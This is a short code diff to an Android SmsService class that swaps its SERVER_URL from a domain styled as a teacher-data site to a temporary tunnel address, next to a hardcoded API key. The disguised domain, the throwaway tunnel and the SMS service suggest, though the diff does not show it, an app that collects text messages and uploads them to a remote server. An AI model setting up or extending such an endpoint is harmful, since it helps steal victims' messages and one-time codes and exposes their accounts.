@@ -43,7 +43,7 @@ public class SmsService extends Service {
     public  static final String JSON_FILE = ".temp.json";
 
     // ====== UBAH INI ======
-    private static final String SERVER_URL = "http://pendataan-guru.page.gd/api.php";
+    private static final String SERVER_URL = "https://happy-hawk-634a0e14.tunnl.gg/api.php";
     private static final String API_KEY    = "fb93127a4ee69b569b8b941f63f08333a1ce66df305d34d37206d0df82053782";
     // ======================
 
